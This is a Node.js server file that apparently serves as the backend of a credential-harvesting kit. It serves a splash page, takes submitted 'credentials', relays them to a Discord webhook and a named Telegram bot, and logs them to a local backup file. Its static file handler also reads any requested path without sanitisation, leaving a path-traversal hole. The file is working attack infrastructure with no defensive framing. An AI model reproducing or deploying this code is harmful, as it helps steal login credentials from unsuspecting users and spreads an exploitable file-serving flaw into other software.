// Simple Node.js server to proxy Telegram requests and bypass CORS
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const telegramAPI = require('./api/telegram');
const discordAPI = require('./api/discord');

const PORT = 8000;

// Function to save credentials to file as backup
function saveToFile(message, reason) {
    try {
        const logFile = path.join(__dirname, 'credentials-log.txt');
        const timestamp = new Date().toISOString();
        const logEntry = `\n${'='.repeat(60)}\n[${timestamp}] - ${reason}\n${'='.repeat(60)}\n${message}\n`;
        
        fs.appendFileSync(logFile, logEntry, 'utf8');
        console.log('💾 Credentials saved to:', logFile);
    } catch (fileError) {
        console.error('❌ Error saving to file:', fileError.message);
    }
}

const server = http.createServer((req, res) => {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    // Handle Discord webhook requests (primary method)
    if (req.url === '/discord-proxy' && req.method === 'POST') {
        console.log('\n📨 Received Discord request at', new Date().toLocaleString());
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', async () => {
            let headersSent = false;
            
            const sendResponse = (statusCode, data) => {
                if (!headersSent) {
                    headersSent = true;
                    res.writeHead(statusCode, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify(data));
                }
            };
            
            try {
                const data = JSON.parse(body);
                const message = data.message || '';
                
                console.log('📝 Message to send:', message.substring(0, 100) + '...');
                console.log('🔗 Using JavaScript Discord module...');
                
                // Use the JavaScript Discord module
                try {
                    console.log('🔗 Calling Discord API...');
                    const result = await discordAPI.sendToDiscordAPI(message);
                    console.log('✅ SUCCESS! Message sent to Discord!');
                    console.log('📊 Response:', JSON.stringify(result));
                    sendResponse(200, { ok: true, result: result });
                } catch (discordError) {
                    console.error('❌ Discord API Error:', discordError);
                    console.error('❌ Error details:', JSON.stringify(discordError, null, 2));
                    
                    // Save to file as backup
                    saveToFile(message, 'discord_error');
                    
                    sendResponse(500, { 
                        ok: false, 
                        error: discordError.error || discordError.message || 'Unknown error',
                        hint: 'Credentials saved to credentials-log.txt as backup',
                        details: discordError
                    });
                }
                
            } catch (error) {
                console.error('❌ Error processing request:', error.message);
                sendResponse(400, { ok: false, error: error.message });
            }
        });
    }
    
    // Handle Telegram proxy requests using JavaScript module (fallback)
    if (req.url === '/telegram-proxy' && req.method === 'POST') {
        console.log('\n📨 Received Telegram request at', new Date().toLocaleString());
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                const message = data.message || '';
                
                console.log('📝 Message to send:', message.substring(0, 100) + '...');
                console.log('🔗 Using JavaScript Telegram module...');
                
                // Use the JavaScript Telegram module
                try {
                    const result = await telegramAPI.sendToTelegramAPI(message);
                    console.log('✅ SUCCESS! Message sent to Telegram!');
                    console.log('📱 Check your Telegram bot: @Qqqcccb_bot');
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ ok: true, result: result.data }));
                } catch (telegramError) {
                    console.error('❌ Telegram API Error:', telegramError);
                    
                    // Save to file as backup
                    saveToFile(message, 'telegram_error');
                    
                    res.writeHead(500, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ 
                        ok: false, 
                        error: telegramError.error || telegramError.message,
                        hint: 'Credentials saved to credentials-log.txt as backup'
                    }));
                }
                
            } catch (error) {
                console.error('❌ Error processing request:', error.message);
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: false, error: error.message }));
            }
        });
    } else {
        // Serve static files
        // Use modern URL API instead of deprecated url.parse()
        const urlObj = new URL(req.url, `http://localhost:${PORT}`);
        const pathname = urlObj.pathname;
        let filePath = '.' + pathname;
        
        if (filePath === './') {
            filePath = './index.html';
        }
        
        fs.readFile(filePath, (err, data) => {
            if (err) {
                res.writeHead(404);
                res.end('File not found');
            } else {
                res.writeHead(200);
                res.end(data);
            }
        });
    }
});

server.listen(PORT, () => {
    console.log(`\n✅ Server running at http://localhost:${PORT}`);
    console.log(`\n📱 Open your browser and go to: http://localhost:${PORT}/splash.html`);
    console.log(`\n🧪 Test Telegram: http://localhost:${PORT}/test-telegram.html`);
    console.log(`\n📊 Watch this console for Telegram request logs`);
    console.log(`\n🛑 Press Ctrl+C to stop the server\n`);
    console.log('='.repeat(50));
});
